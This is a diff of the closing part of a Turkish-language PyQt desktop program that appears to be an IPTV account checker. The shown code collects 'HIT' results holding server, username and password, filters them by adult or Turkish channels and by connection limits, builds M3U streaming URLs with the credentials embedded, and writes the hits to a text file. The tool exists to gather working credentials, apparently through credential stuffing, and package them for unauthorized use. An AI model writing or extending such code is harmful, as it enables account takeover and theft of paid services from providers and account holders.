+        self.lbl_progress.setText(f"{self.done_accounts} / {self.total_accounts}")
+
+    def clear_hits(self, soft=False):
+        self.hits.clear()
+        self.filtered_cache.clear()
+        self.link_counter = 0
+        self.hit_box.clear()
+        self.hit_label.setText(f"Bulunan HIT sayısı: 0")
+        if not self.is_scanning:
+            self.progress.setMaximum(1)
+            self.progress.setValue(0)
+            self.lbl_progress.setText("0 / 0")
+        self.cbo_max_conn.blockSignals(True)
+        self.cbo_max_conn.clear()
+        self.cbo_max_conn.addItem("Max bağlantı: Tümü", userData=None)
+        self.cbo_max_conn.blockSignals(False)
+
+    def on_hit(self, hit: Dict[str, Any]):
+        self.link_counter += 1
+        hit["_link_no"] = self.link_counter
+        self.hits.append(hit)
+        self._refresh_max_conn_items()
+        self.render_hits()
+
+    def _refresh_max_conn_items(self):
+        vals = sorted({int(h.get("max_connections", 0)) for h in self.hits})
+        cur = self.cbo_max_conn.currentData()
+        self.cbo_max_conn.blockSignals(True)
+        self.cbo_max_conn.clear()
+        self.cbo_max_conn.addItem("Max bağlantı: Tümü", userData=None)
+        for v in vals:
+            self.cbo_max_conn.addItem(f"Max bağlantı: {v}", userData=v)
+        if cur is not None:
+            idx = self.cbo_max_conn.findData(cur)
+            if idx >= 0:
+                self.cbo_max_conn.setCurrentIndex(idx)
+        self.cbo_max_conn.blockSignals(False)
+
+    def _apply_filters(self, rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        hide_adult = self.chk_hide_adult.isChecked()
+        only_tr    = self.chk_only_tr.isChecked()
+        sel_max    = self.cbo_max_conn.currentData()
+
+        out = []
+        for h in rows:
+            cats = h.get("categories", []) or []
+            if hide_adult:
+                up = " | ".join(cats).upper()
+                if ("ADULT" in up) or ("+18" in up):
+                    continue
+            if only_tr:
+                if not any(c.strip().upper().startswith("TR") for c in cats):
+                    continue
+            if sel_max is not None and int(h.get("max_connections", 0)) != int(sel_max):
+                continue
+            out.append(h)
+        return out
+
+    def render_hits(self):
+        filtered = self._apply_filters(self.hits)
+        self.hit_box.clear()
+        self.filtered_cache.clear()
+        for h in filtered:
+            html = self._hit_to_html(h)
+            self.hit_box.append(html + "<hr>")
+            self.filtered_cache.append(html)
+        self.hit_label.setText(f"Bulunan HIT sayısı: {len(filtered)}")
+
+    def _hit_to_html(self, h: Dict[str, Any]) -> str:
+        server = h.get("server", "")
+        user = h.get("username", "")
+        pwd = h.get("password", "")
+        link_no = h.get("_link_no", 1)
+        m3u_url = build_m3u_url(server, user, pwd)
+        lines = [
+            f"🔗 {link_no}",
+            m3u_url,
+            f"DURUM : {h.get('status', '')}",
+            f"KULLANICI ADI : {user}",
+            f"ŞİFRE : {pwd}",
+            f"MAKSİMUM BAĞLANTI : {h.get('max_connections', 0)}",
+            f"AKTİF BAĞLANTI : {h.get('active_cons', 0)}",
+            f"DENEME : {'Evet' if h.get('trial', False) else 'Hayır'}",
+            f"Oluşturulma Tarihi (UTC) : {h.get('created_at', '-')}",
+            f"Bitiş Tarihi (UTC) : {h.get('exp_date', '-')}",
+            f"İzin Verilen Çıktılar : {h.get('outputs', '-')}",
+        ]
+        cats = h.get("categories", [])
+        if cats:
+            lines.append("📺 Kanallar : " + "► " + "► ".join(cats))
+        return "<br>".join(lines)
+
+    def save_hits_to_file(self):
+        if not self.filtered_cache:
+            QMessageBox.information(self, "Bilgi", "Kaydedilecek içerik yok.")
+            return
+        path, _ = QFileDialog.getSaveFileName(self, "HIT'leri Kaydet", str(APP_DIR / "hits.txt"), "Text Files (*.txt)")
+        if not path:
+            return
+        with open(path, "w", encoding="utf-8") as f:
+            for html in self.filtered_cache:
+                f.write(html.replace("<br>", "\n").replace("<hr>", "\n" + "-" * 40 + "\n"))
+                f.write("\n" + "-" * 40 + "\n")
+
+def main():
+    app = QApplication(sys.argv)
+    win = MainWindow()
+    win.show()
+    sys.exit(app.exec())
+
+if __name__ == "__main__":
+    main()
